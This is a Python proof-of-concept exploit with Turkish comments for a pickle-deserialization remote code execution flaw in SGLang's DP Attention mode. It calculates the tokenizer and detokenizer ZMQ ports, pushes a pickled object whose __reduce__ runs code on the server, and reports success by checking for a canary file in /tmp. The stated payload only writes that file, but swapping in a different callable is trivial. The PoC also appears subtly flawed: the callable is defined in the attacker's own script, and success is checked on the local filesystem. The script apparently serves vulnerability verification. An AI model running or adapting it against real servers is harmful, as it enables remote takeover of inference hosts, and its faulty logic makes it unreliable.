#!/usr/bin/env python3
"""
SGLang ShadowMQ PoC — Canlı Sunucu Testi

Bu script, çalışan bir SGLang sunucusunun DP Attention modundaki
TokenizerManager ve DetokenizerManager PULL soketlerine bağlanarak
pickle RCE zafiyetini doğrular.

KULLANIM:
  # Önce sunucuyu başlat:
  python -m sglang.launch_server \
    --model-path Qwen/Qwen3-4B \
    --host 127.0.0.1 --port 30000 \
    --tp 4 --dp 2 --enable-dp-attention \
    --context-length 4096

  # Sonra bu script'i çalıştır:
  python docs/security/poc_live_test.py --port 30000

GÜVENLİK:
  - Zararsız payload: sadece /tmp/sglang_rce_canary.txt dosyasına yazar
  - Komut çalıştırmaz, reverse shell açmaz
  - Sunucuyu çökertme riski düşük (tek mesaj gönderir)

NOT: Bu test sunucunun tokenizer/detokenizer event loop'unu bozabilir.
     Test sonrası sunucuyu yeniden başlatmanız gerekebilir.
"""

import argparse
import os
import pickle
import sys
import time

try:
    import zmq
except ImportError:
    print("HATA: pyzmq yüklü değil. 'pip install pyzmq' çalıştırın.")
    sys.exit(1)


# DP Attention port offset sabitleri (server_args.py:6487, 6550-6553)
ZMQ_TCP_PORT_DELTA = 233
# port_base = dist_init_port + 1 = (port + 233) + 1 = port + 234
# tokenizer_port = port_base       = port + 234
# detokenizer_port = port_base + 1 = port + 235
# rpc_port = port_base + 2         = port + 236

CANARY_FILE = "/tmp/sglang_rce_canary.txt"


class HarmlessCanary:
    """
    Zararsız pickle payload.
    pickle.loads() sırasında __reduce__ tetiklenir,
    sadece bir dosyaya "RCE confirmed" yazar.
    """
    def __reduce__(self):
        return (self._write_canary, ())

    @staticmethod
    def _write_canary():
        with open(CANARY_FILE, "w") as f:
            f.write(f"RCE_CONFIRMED timestamp={time.time()}\n")
        return "canary_written"


def test_port(host: str, port: int, name: str, timeout_ms: int = 3000) -> bool:
    """Bir TCP portuna PUSH ile bağlanıp pickle payload gönder."""
    endpoint = f"tcp://{host}:{port}"
    print(f"\n{'='*60}")
    print(f"TEST: {name}")
    print(f"Hedef: {endpoint}")
    print(f"{'='*60}")

    # Önce canary dosyasını sil
    if os.path.exists(CANARY_FILE):
        os.remove(CANARY_FILE)

    ctx = zmq.Context()
    sock = ctx.socket(zmq.PUSH)
    sock.setsockopt(zmq.LINGER, 0)
    sock.setsockopt(zmq.SNDTIMEO, timeout_ms)

    try:
        print(f"[1] PUSH soketi bağlanıyor: {endpoint}")
        sock.connect(endpoint)
        # ZMQ connect async — bağlantı kurulması için kısa bekleme
        time.sleep(0.5)

        print(f"[2] Zararsız pickle payload (HarmlessCanary) gönderiliyor...")
        payload = HarmlessCanary()
        sock.send_pyobj(payload)
        print(f"[3] Gönderildi. Canary dosyası kontrol ediliyor...")

        # Karşı tarafın pickle.loads() çağırması için bekle
        time.sleep(2)

        if os.path.exists(CANARY_FILE):
            with open(CANARY_FILE) as f:
                content = f.read().strip()
            print(f"[+] CANARY DOSYASI BULUNDU: {content}")
            print(f"[+] __reduce__ tetiklendi → RCE DOĞRULANDI")
            os.remove(CANARY_FILE)
            return True
        else:
            print(f"[-] Canary dosyası bulunamadı.")
            print(f"    Olası nedenler:")
            print(f"    - Port yanlış (sunucu bu portu dinlemiyor olabilir)")
            print(f"    - Soket tipi uyumsuz (PULL değil)")
            print(f"    - Mesaj henüz işlenmedi (timeout artırın)")
            print(f"    - Sunucu DP attention modunda değil")
            return False

    except zmq.error.Again:
        print(f"[-] Timeout — mesaj gönderilemedi (port kapalı veya soket tipi uyumsuz)")
        return False
    except Exception as e:
        print(f"[-] Hata: {e}")
        return False
    finally:
        sock.close()
        ctx.term()


def check_port_open(host: str, port: int) -> bool:
    """TCP portunun açık olup olmadığını kontrol et."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((host, port))
        s.close()
        return True
    except (ConnectionRefusedError, OSError):
        return False


def main():
    parser = argparse.ArgumentParser(description="SGLang DP Attention RCE PoC")
    parser.add_argument("--host", default="127.0.0.1", help="Hedef host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=30000, help="SGLang HTTP port (default: 30000)")
    args = parser.parse_args()

    host = args.host
    base_port = args.port

    # Port hesaplama (server_args.py:6544, 6549-6553)
    dist_init_port = base_port + ZMQ_TCP_PORT_DELTA  # 30233
    port_base = dist_init_port + 1                    # 30234
    tokenizer_port = port_base                        # 30234
    detokenizer_port = port_base + 1                  # 30235
    rpc_port = port_base + 2                          # 30236

    print("=" * 60)
    print("SGLang ShadowMQ PoC — Canlı Sunucu Testi")
    print("=" * 60)
    print()
    print(f"Hedef: {host}")
    print(f"HTTP port: {base_port}")
    print(f"Hesaplanan DP Attention portları:")
    print(f"  tokenizer_port (PULL bind)    = {tokenizer_port}")
    print(f"  detokenizer_port (PULL bind)  = {detokenizer_port}")
    print(f"  rpc_port (DEALER bind)        = {rpc_port}")
    print()

    # Port erişilebilirlik kontrolü
    print("Port erişilebilirlik kontrolü:")
    ports_to_check = {
        "HTTP": base_port,
        "tokenizer (PULL)": tokenizer_port,
        "detokenizer (PULL)": detokenizer_port,
        "rpc (DEALER)": rpc_port,
    }
    for name, port in ports_to_check.items():
        status = "AÇIK" if check_port_open(host, port) else "KAPALI"
        print(f"  {host}:{port} ({name}): {status}")
    print()

    # TokenizerManager testi
    tok_result = test_port(host, tokenizer_port, "TokenizerManager PULL (tokenizer_ipc_name)")

    # DetokenizerManager testi
    detok_result = test_port(host, detokenizer_port, "DetokenizerManager PULL (detokenizer_ipc_name)")

    # Sonuç
    print()
    print("=" * 60)
    print("ÖZET")
    print("=" * 60)
    print(f"  TokenizerManager RCE:   {'DOĞRULANDI' if tok_result else 'DOĞRULANAMADI'}")
    print(f"  DetokenizerManager RCE: {'DOĞRULANDI' if detok_result else 'DOĞRULANAMADI'}")
    print()

    if tok_result or detok_result:
        print("EN AZ BİR RCE DOĞRULANDI!")
        print()
        print("NOT: Sunucu bu noktadan sonra kararsız olabilir.")
        print("     Yeniden başlatmanız önerilir.")
        return 0
    else:
        print("RCE doğrulanamadı. Olası nedenler:")
        print("  1. Sunucu --enable-dp-attention ile başlatılmadı")
        print("  2. Port hesaplaması yanlış (ss -tlnp ile kontrol edin)")
        print("  3. Sunucu henüz tam olarak ayağa kalkmadı")
        return 1


if __name__ == "__main__":
    sys.exit(main())
